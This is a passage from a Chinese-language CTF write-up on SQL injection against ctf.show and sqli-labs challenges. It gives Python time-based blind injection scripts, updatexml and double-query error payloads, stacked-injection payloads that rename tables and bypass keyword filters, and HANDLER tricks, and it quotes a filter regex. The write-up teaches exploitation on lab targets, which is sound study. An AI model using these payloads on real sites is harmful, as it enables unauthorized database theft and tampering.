class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>脚本如下</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">#@Author:quan9i</span>\n<span class=\"token keyword\">import</span> requests\n\nurl <span class=\"token operator\">=</span> <span class=\"token string\">\"http://62e82e3d-ef80-4818-86f3-50e23a409d63.challenge.ctf.show/api/\"</span>\nflag<span class=\"token operator\">=</span><span class=\"token string\">\"ctfshow&#123;\"</span>\n<span class=\"token keyword\">for</span> i <span class=\"token operator\">in</span> range<span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">,</span><span class=\"token number\">55</span><span class=\"token punctuation\">)</span>:\n    <span class=\"token keyword\">for</span> j <span class=\"token operator\">in</span> <span class=\"token string\">\"0123456789ab,cdefghijklmnopqrstuvwxyz_-&#123;&#125;\"</span>:\n            <span class=\"token comment\">#查数据库</span>\n            <span class=\"token comment\">#payload=\"select group_concat(table_name) from information_schema.tables where table_schema=database()\"</span>\n            <span class=\"token comment\">#print(payload)</span>\n            <span class=\"token comment\">#查表</span>\n            <span class=\"token comment\">#payload=\"select group_concat(table_name) from information_schema.tables where table_schema=database())\"</span>\n            <span class=\"token comment\">#print(payload)</span>\n            <span class=\"token comment\">#查列                                                                                                                                                                                                                                                                                 </span>\n            <span class=\"token comment\">#payload=\"select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flaga'\"</span>\n            <span class=\"token comment\">#print(payload)</span>\n            <span class=\"token comment\">#查字段</span>\n            payload<span class=\"token operator\">=</span><span class=\"token string\">\"select flagaabc from ctfshow_flaga\"</span>\n            <span class=\"token comment\">#print(payload)</span>\n            params<span class=\"token operator\">=</span>&#123;\n                <span class=\"token string\">'u'</span>:f<span class=\"token string\">\"concat(if(substr((&#123;payload&#125;),&#123;i&#125;,1)='&#123;j&#125;',sleep(1),0),1);\"</span>\n            &#125;\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>params<span class=\"token punctuation\">)</span>\n            try:\n                response <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>url<span class=\"token punctuation\">,</span>params<span class=\"token operator\">=</span>params<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n                <span class=\"token comment\">#print(\"执行失败\")</span>\n            <span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> e:\n                <span class=\"token comment\">#print(\"执行成功\")</span>\n                flag <span class=\"token operator\">+</span><span class=\"token operator\">=</span> j\n                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span>                   <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"0X03（二分法时间盲注）\"><a href=\"#0X03（二分法时间盲注）\" class=\"headerlink\" title=\"0X03（二分法时间盲注）\"></a>0X03（二分法时间盲注）</h3><p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539733.png\" alt=\"在这里插入图片描述\"><br>提示用了单引号</p>\n<p>本关看靶场的话不知道注入点在哪(可能仅对我这个小白而言)<br>，但仔细去查看首页界面的js文件的话，可以发现api下传入的数据是ip和debug，ip这个的话我猜测是可注入的点，测试了一下，确实是这样<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539843.png\" alt=\"在这里插入图片描述\"><br>本地测试如下（post注入）</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">debug<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token operator\">&amp;</span>ip<span class=\"token operator\">=</span><span class=\"token number\">1</span>' <span class=\"token operator\">or</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>ascii<span class=\"token punctuation\">(</span>substr<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> group_concat\n<span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span> <span class=\"token keyword\">where</span> \ntable_schema<span class=\"token operator\">=</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>但由于这样比较缓慢，因此这里需要借用脚本，脚本内容如下</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">import</span> requests\n\nurl <span class=\"token operator\">=</span> <span class=\"token string\">\"http://98966a40-1d76-48f8-a258-f9a70e6ff8dc.challenge.ctf.show/api/\"</span>\n\nresult <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span>\ni <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n\n<span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span>:\n    i <span class=\"token operator\">=</span> i <span class=\"token operator\">+</span> <span class=\"token number\">1</span>\n    head <span class=\"token operator\">=</span> <span class=\"token number\">32</span>\n    tail <span class=\"token operator\">=</span> <span class=\"token number\">127</span>\n\n    <span class=\"token keyword\">while</span> head <span class=\"token operator\">&lt;</span> tail:\n        mid <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>head <span class=\"token operator\">+</span> tail<span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">1</span>\n        <span class=\"token comment\"># 查数据库</span>\n        payload <span class=\"token operator\">=</span> <span class=\"token string\">\"select group_concat(table_name) from information_schema.tables where table_schema=database()\"</span>\n        <span class=\"token comment\"># 查字段</span>\n        <span class=\"token comment\"># payload = \"select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'\"</span>\n        <span class=\"token comment\"># 查flag</span>\n        <span class=\"token comment\">#payload = \"select flaga from ctfshow_flagx\"</span>\n        <span class=\"token keyword\">data</span> <span class=\"token operator\">=</span> &#123;\n            <span class=\"token string\">'ip'</span>: f<span class=\"token string\">\"if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))>&#123;mid&#125;,sleep(1),1)\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">'debug'</span>: <span class=\"token string\">'0'</span>\n        &#125;\n        try:<span class=\"token comment\">#try后为检测范围</span>\n            r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> <span class=\"token keyword\">data</span><span class=\"token operator\">=</span><span class=\"token keyword\">data</span><span class=\"token punctuation\">,</span> timeout<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#延时超过一秒就按异常处理，因为设置的是一秒，所以异常时即为正确情况</span>\n            tail <span class=\"token operator\">=</span> mid\n        <span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> e : <span class=\"token comment\">#检测到异常时</span>\n            head <span class=\"token operator\">=</span> mid <span class=\"token operator\">+</span><span class=\"token number\">1</span>\n\n    <span class=\"token keyword\">if</span> head <span class=\"token operator\">!=</span> <span class=\"token number\">32</span>:\n        result <span class=\"token operator\">+</span><span class=\"token operator\">=</span> chr<span class=\"token punctuation\">(</span>head<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span>:\n        <span class=\"token keyword\">break</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"报错注入-1\"><a href=\"#报错注入-1\" class=\"headerlink\" title=\"报错注入\"></a>报错注入</h2><h3 id=\"0X01-2\"><a href=\"#0X01-2\" class=\"headerlink\" title=\"0X01\"></a>0X01</h3><p>发现在unname中注入会被转义，所以我们选择在passwd中进行注入<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539543.png\" alt=\"在这里插入图片描述\"><br>此时采用xpath函数来破解<br>获取表payload：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">uname<span class=\"token operator\">=</span>admin <span class=\"token operator\">&amp;</span>passwd<span class=\"token operator\">=</span>admin<span class=\"token string\">' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='</span>security' <span class=\"token keyword\">limit</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#&amp;submit=Submit</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539512.png\" alt=\"在这里插入图片描述\"><br> 获取表名payload：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">uname<span class=\"token operator\">=</span>admin<span class=\"token operator\">&amp;</span>passwd<span class=\"token operator\">=</span>admin<span class=\"token string\">' or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='</span>security' <span class=\"token keyword\">limit</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#&amp;submit=Submit</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539600.png\" alt=\"在这里插入图片描述\"><br> 获取列名payload</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">uname<span class=\"token operator\">=</span>admin<span class=\"token operator\">&amp;</span>passwd<span class=\"token operator\">=</span>admin<span class=\"token string\">' or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='</span>emails' <span class=\"token keyword\">limit</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#&amp;submit=Submit</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p> 获取字段信息payload </p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">uname<span class=\"token operator\">=</span>admin<span class=\"token operator\">&amp;</span>passwd<span class=\"token operator\">=</span>admin' <span class=\"token operator\">or</span> updatexml<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>concat<span class=\"token punctuation\">(</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> email_id <span class=\"token keyword\">from</span> security<span class=\"token punctuation\">.</span>emails <span class=\"token keyword\">limit</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#&amp;submit=Submit</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539652.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"0X02-3\"><a href=\"#0X02-3\" class=\"headerlink\" title=\"0X02\"></a>0X02</h3><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"> $<span class=\"token keyword\">sql</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"select id,username,pass from ctfshow_user where id = '\"</span><span class=\"token punctuation\">.</span>$id<span class=\"token punctuation\">.</span><span class=\"token string\">\"' limit 1;\"</span><span class=\"token punctuation\">;</span>\n返回逻辑\n过滤updatexml extractvalue <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>这里把两个常用的报错注入函数都给ban了，那这里就需要利用双查询注入了<br><a href=\"https://www.2cto.com/article/201303/192718.html\">详细讲解双查询注入</a><br>因此本关我们构造payload如下</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">爆表\n?id<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token string\">' union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e,floor(rand()*2))a from information_schema.tables group by a%23\n爆列\n?id=-1'</span> <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>concat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> column_name <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span> <span class=\"token keyword\">where</span> table_name<span class=\"token operator\">=</span><span class=\"token string\">'\nctfshow_flags'</span> <span class=\"token keyword\">limit</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">,</span>floor<span class=\"token punctuation\">(</span>rand<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>a <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span> <span class=\"token keyword\">group</span> <span class=\"token keyword\">by</span> a<span class=\"token operator\">%</span><span class=\"token number\">23</span>\n爆flag\n?id<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span>' <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>concat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> flag2 <span class=\"token keyword\">from</span> ctfshow_flags <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">,</span>floor<span class=\"token punctuation\">(</span>rand<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>a <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span> <span class=\"token keyword\">group</span> <span class=\"token keyword\">by</span> a<span class=\"token operator\">%</span><span class=\"token number\">23</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"堆叠注入-1\"><a href=\"#堆叠注入-1\" class=\"headerlink\" title=\"堆叠注入\"></a>堆叠注入</h2><h3 id=\"0X01-3\"><a href=\"#0X01-3\" class=\"headerlink\" title=\"0X01\"></a>0X01</h3><p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539688.png\" alt=\"在这里插入图片描述\">本关我们尝试以弱口令admin作为账号，对pwd进行堆叠注入测试，构造payload如下</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token number\">1</span><span class=\"token string\">'insert into users(id,username,password) values(88,'</span>aaa<span class=\"token string\">','</span>bbb'<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">#</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>执行结果<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539777.png\" alt=\"在这里插入图片描述\"><br>此时查看sql数据库<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539440.png\" alt=\"在这里插入图片描述\"><br>查看源码</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">$username <span class=\"token operator\">=</span> mysqli_real_escape_string<span class=\"token punctuation\">(</span>$con1<span class=\"token punctuation\">,</span> $_POST<span class=\"token punctuation\">[</span><span class=\"token string\">\"login_user\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n$password <span class=\"token operator\">=</span> $_POST<span class=\"token punctuation\">[</span><span class=\"token string\">\"login_password\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>username进行了转义，但pwd没有用函数进行限制,因此这里就出现了堆叠注入漏洞</p>\n<h3 id=\"0X02-4\"><a href=\"#0X02-4\" class=\"headerlink\" title=\"0X02\"></a>0X02</h3><p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539717.png\" alt=\"在这里插入图片描述\"><br>打开靶场后，首先判断一下id包裹方式<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539732.png\" alt=\"在这里插入图片描述\"><br>判断出为单引号包裹，此时判断一下字段数<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539122.png\" alt=\"在这里插入图片描述\"><br>说明字段为2，此时尝试使用联合查询<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539128.png\" alt=\"在这里插入图片描述\"><br>发现联合查询被ban，此时我们无法使用联合查询进行注入，尝试使用堆叠注入，还有部分被过滤，select无法使用，我们可以使用show，进行爆库<br>构造如下payload</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token operator\">-</span><span class=\"token number\">1</span>'<span class=\"token punctuation\">;</span><span class=\"token keyword\">show</span> <span class=\"token keyword\">databases</span><span class=\"token punctuation\">;</span><span class=\"token comment\">#</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>执行结果如下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539280.png\" alt=\"在这里插入图片描述\">爆表<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539575.png\" alt=\"在这里插入图片描述\"><br>爆出列名</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token operator\">-</span><span class=\"token number\">1</span>'<span class=\"token punctuation\">;</span><span class=\"token keyword\">show</span> <span class=\"token keyword\">columns</span> <span class=\"token keyword\">from</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>1919810931114514<span class=\"token punctuation\">`</span></span><span class=\"token punctuation\">;</span><span class=\"token comment\">#</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>执行结果<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539727.png\" alt=\"在这里插入图片描述\"></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token operator\">-</span><span class=\"token number\">1</span>'<span class=\"token punctuation\">;</span><span class=\"token keyword\">show</span> <span class=\"token keyword\">columns</span> <span class=\"token keyword\">from</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>words<span class=\"token punctuation\">`</span></span><span class=\"token punctuation\">;</span><span class=\"token comment\">#</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539070.png\" alt=\"在这里插入图片描述\">这里我们可以看出这个words表是默认查询的表(这张表的结构是一个数字加一个字符串)<br>，众所周知show是无法查看字段信息的，我们该如何获取flag呢<br>这里alert和rename没有被限制，我们可以利用rename将words这张表改名为words1，再将数字表改名为words，但是呢，此时他是缺少了一个id列的，因此我们可以用alert将flag列改名为id列，并规定类型为varchar，构造payload如下</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token number\">1</span>'<span class=\"token punctuation\">;</span><span class=\"token keyword\">RENAME</span> <span class=\"token keyword\">TABLE</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>words<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">TO</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>words1<span class=\"token punctuation\">`</span></span><span class=\"token punctuation\">;</span><span class=\"token keyword\">RENAME</span> <span class=\"token keyword\">TABLE</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>1919810931114514<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">TO</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>words<span class=\"token punctuation\">`</span></span><span class=\"token punctuation\">;</span><span class=\"token keyword\">ALTER</span> <span class=\"token keyword\">TABLE</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>words<span class=\"token punctuation\">`</span></span> CHANGE <span class=\"token identifier\"><span class=\"token punctuation\">`</span>flag<span class=\"token punctuation\">`</span></span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>id<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">VARCHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">;</span><span class=\"token keyword\">show</span> <span class=\"token keyword\">columns</span> <span class=\"token keyword\">from</span> words<span class=\"token punctuation\">;</span><span class=\"token comment\">#</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>此时再利用万能语句，即可得到flag</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token number\">1</span>' <span class=\"token operator\">or</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token comment\">#</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539196.png\" alt=\"在这里插入图片描述\">这里还有一种方法，就是采用预编译的方法</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">set是设置一个新列\nprepare是进行定义一个语句\nexecute是执行<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>构造payload如下</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token string\">';set @sql = CONCAT('</span>se<span class=\"token string\">','</span>lect <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>1919810931114514<span class=\"token punctuation\">`</span></span><span class=\"token punctuation\">;</span>'<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">prepare</span> stmt <span class=\"token keyword\">from</span> <span class=\"token variable\">@sql</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">EXECUTE</span> stmt<span class=\"token punctuation\">;</span><span class=\"token comment\">#</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>执行结果<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539238.png\" alt=\"在这里插入图片描述\">这里用strstr函数过滤了set和prepare关键词，但strstr这个函数并不能区分大小写，我们将其大写即可</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token string\">';sEt @sql = CONCAT('</span>se<span class=\"token string\">','</span>lect <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>1919810931114514<span class=\"token punctuation\">`</span></span><span class=\"token punctuation\">;</span>'<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">prEpare</span> stmt <span class=\"token keyword\">from</span> <span class=\"token variable\">@sql</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">EXECUTE</span> stmt<span class=\"token punctuation\">;</span><span class=\"token comment\">#</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>执行结果<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539310.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"0X03-1\"><a href=\"#0X03-1\" class=\"headerlink\" title=\"0X03\"></a>0X03</h3><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">//师傅说过滤的越多越好</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>preg_match<span class=\"token punctuation\">(</span><span class=\"token string\">'/file|into|dump|union|select|update|delete|alter|drop|create|describe|set/i'</span><span class=\"token punctuation\">,</span>$username<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>&#123;\n  die<span class=\"token punctuation\">(</span>json_encode<span class=\"token punctuation\">(</span>$ret<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>发现可以进行堆叠注入，show未被ban，因此可用show来获取表名列名，payload如下</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">admin<span class=\"token string\">';show tables;#\nadmin'</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">show</span> <span class=\"token keyword\">columns</span> <span class=\"token keyword\">from</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>ctfshow_flagasa<span class=\"token punctuation\">`</span></span><span class=\"token punctuation\">;</span><span class=\"token comment\">#</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>有如下两种方法获取flag</p>\n<p>预编译</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">admin<span class=\"token string\">';prepare quan9i from concat('</span>selec<span class=\"token string\">','</span>t <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>ctfshow_flagasa<span class=\"token punctuation\">`</span></span>'<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">execute</span> quan9i<span class=\"token punctuation\">;</span><span class=\"token comment\">#</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>handle<br>不熟悉可以看这篇文章<a href=\"https://blog.51cto.com/u_15023289/2559944\">https://blog.51cto.com/u_15023289/2559944</a>，我们在这里所使用其的中心思想就是<code>HANDLER … OPEN 语句打开一个表，后续的 HANDLER … READ 语句可以访问它。此表对象不被其他会话共享，并且直到调用 HANDLER … CLOSE 或者会话终止才会关闭。</code></p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">handler</span> ctfshow_flagasa <span class=\"token keyword\">open</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">handler</span> ctfshow_flagasa <span class=\"token keyword\">read</span> <span class=\"token keyword\">first</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h2 id=\"二次注入-1\"><a href=\"#二次注入-1\" class=\"headerlink\" title=\"二次注入\"></a>二次注入</h2><p>进入界面后如下图所示<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539644.png\" alt=\"在这里插入图片描述\"><br>发现下方有注册的，我们点击注册，用弱口令admin来尝试，命名为admin’#，密码设置为111，如下图<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539182.png\" alt=\"在这里插入图片描述\"><br>此时查询数据库，发现注册的已经插入数据库中<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539808.png\" alt=\"在这里插入图片描述\"><br>我们登录看看，如下图<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539211.png\" alt=\"在这里插入图片描述\"><br>发现是更改密码的，我们试着将111改123，此时查看数据库<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141539058.png\" 